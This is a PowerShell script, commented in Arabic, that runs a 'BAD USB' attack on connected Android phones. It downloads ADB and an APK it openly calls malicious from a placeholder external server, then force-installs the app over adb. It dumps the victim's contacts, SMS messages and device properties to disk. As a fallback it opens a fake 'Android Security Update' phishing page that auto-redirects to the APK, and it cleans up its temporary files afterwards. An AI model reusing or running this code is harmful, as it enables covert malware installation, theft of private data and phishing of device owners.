# Android Attack PowerShell Script
# تأكد من تشغيله بصلاحيات المدير

Write-Host "Starting Android BAD USB Attack..." -ForegroundColor Red

# الدالة للتحقق من وجود ADB
function Test-ADB {
    try {
        $adb_check = adb version 2>&1
        return $true
    } catch {
        return $false
    }
}

# الدالة لتحميل ADB
function Install-ADB {
    Write-Host "Downloading ADB Tools..." -ForegroundColor Yellow
    
    $adb_url = "https://your-actual-server.herokuapp.com/platform-tools.zip"
    $download_path = "$env:TEMP\platform-tools.zip"
    $extract_path = "$env:TEMP\platform-tools"
    
    # تحميل platform-tools
    try {
        Invoke-WebRequest -Uri $adb_url -OutFile $download_path
        Write-Host "Download completed" -ForegroundColor Green
    } catch {
        Write-Host "Download failed: $_" -ForegroundColor Red
        return $false
    }
    
    # فك الضغط
    try {
        Expand-Archive -Path $download_path -DestinationPath $extract_path -Force
        Write-Host "Extraction completed" -ForegroundColor Green
    } catch {
        Write-Host "Extraction failed: $_" -ForegroundColor Red
        return $false
    }
    
    # إضافة إلى PATH
    $env:Path += ";$extract_path"
    return $true
}

# الدالة للتحقق من أجهزة الأندرويد
function Check-AndroidDevices {
    $devices_output = adb devices
    $connected_devices = $devices_output | Select-String "device$"
    
    if ($connected_devices.Count -gt 0) {
        Write-Host "Found $($connected_devices.Count) Android device(s)" -ForegroundColor Green
        return $true
    } else {
        Write-Host "No Android devices found" -ForegroundColor Yellow
        return $false
    }
}

# الدالة لتثبيت التطبيق الخبيث
function Install-MaliciousApp {
    Write-Host "Installing malicious APK..." -ForegroundColor Yellow
    
    $apk_url = "https://your-actual-server.herokuapp.com/update_service.apk"
    $local_apk = "$env:TEMP\update_service.apk"
    
    # تحميل الـ APK
    try {
        Invoke-WebRequest -Uri $apk_url -OutFile $local_apk
        Write-Host "APK downloaded successfully" -ForegroundColor Green
    } catch {
        Write-Host "APK download failed: $_" -ForegroundColor Red
        return $false
    }
    
    # تثبيت الـ APK
    try {
        adb install -r $local_apk
        Write-Host "APK installed successfully" -ForegroundColor Green
        return $true
    } catch {
        Write-Host "APK installation failed: $_" -ForegroundColor Red
        return $false
    }
}

# الدالة لجمع البيانات
function Harvest-Data {
    Write-Host "Harvesting data from Android device..." -ForegroundColor Yellow
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $output_dir = "C:\BADUSB_ANDROID_OPERATION\05_OUTPUT\harvested_data_$timestamp"
    
    New-Item -ItemType Directory -Path $output_dir -Force | Out-Null
    
    # جمع جهات الاتصال
    try {
        adb shell content query --uri content://contacts/phones/ > "$output_dir\contacts.txt"
        Write-Host "Contacts harvested" -ForegroundColor Green
    } catch {
        Write-Host "Failed to harvest contacts" -ForegroundColor Red
    }
    
    # جمع الرسائل
    try {
        adb shell content query --uri content://sms/ > "$output_dir\sms.txt"
        Write-Host "SMS harvested" -ForegroundColor Green
    } catch {
        Write-Host "Failed to harvest SMS" -ForegroundColor Red
    }
    
    # معلومات الجهاز
    try {
        adb shell getprop > "$output_dir\device_info.txt"
        Write-Host "Device info harvested" -ForegroundColor Green
    } catch {
        Write-Host "Failed to harvest device info" -ForegroundColor Red
    }
    
    return $output_dir
}

# الدالة للهندسة الاجتماعية
function Start-SocialEngineering {
    Write-Host "Starting social engineering fallback..." -ForegroundColor Yellow
    
    $fake_page = @"
<html>
<head>
    <title>Android Security Update</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; padding: 50px; }
        .alert { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .button { background: #e74c3c; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="alert">
        <h2>Android Security Update Required</h2>
        <p>Your device has critical security vulnerabilities that require immediate attention.</p>
        <button class="button" onclick="downloadUpdate()">Download Security Update</button>
    </div>
    <script>
        function downloadUpdate() {
            window.location.href = 'https://your-actual-server.herokuapp.com/update_service.apk';
            alert('Please install the update and grant required permissions for security purposes.');
        }
        setTimeout(downloadUpdate, 3000);
    </script>
</body>
</html>
"@
    
    $page_path = "$env:TEMP\security_alert.html"
    $fake_page | Out-File -FilePath $page_path -Encoding UTF8
    Start-Process $page_path
}

# التنفيذ الرئيسي
Write-Host "=== ANDROID BAD USB ATTACK STARTED ===" -ForegroundColor Cyan

# الخطوة 1: التحقق من ADB
if (-not (Test-ADB)) {
    Write-Host "ADB not found, installing..." -ForegroundColor Yellow
    if (-not (Install-ADB)) {
        Write-Host "Failed to install ADB, starting social engineering..." -ForegroundColor Red
        Start-SocialEngineering
        exit
    }
}

# الخطوة 2: التحقق من الأجهزة
if (Check-AndroidDevices) {
    Write-Host "Android device connected, proceeding with attack..." -ForegroundColor Green
    
    # محاولة تفعيل خيارات المطور
    try {
        adb shell settings put global development_settings_enabled 1
        adb shell settings put global adb_enabled 1
        Write-Host "Developer options enabled" -ForegroundColor Green
    } catch {
        Write-Host "Failed to enable developer options" -ForegroundColor Red
    }
    
    # تثبيت التطبيق الخبيث
    if (Install-MaliciousApp) {
        Write-Host "Malicious app installed successfully" -ForegroundColor Green
        
        # جمع البيانات
        $harvested_path = Harvest-Data
        Write-Host "Data harvested to: $harvested_path" -ForegroundColor Green
        
    } else {
        Write-Host "Failed to install app, harvesting available data..." -ForegroundColor Red
        Harvest-Data
    }
    
} else {
    Write-Host "No Android devices detected, starting social engineering..." -ForegroundColor Yellow
    Start-SocialEngineering
}

Write-Host "=== ATTACK COMPLETED ===" -ForegroundColor Cyan

# تنظيف الملفات المؤقتة
Remove-Item "$env:TEMP\platform-tools.zip" -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\update_service.apk" -ErrorAction SilentlyContinue
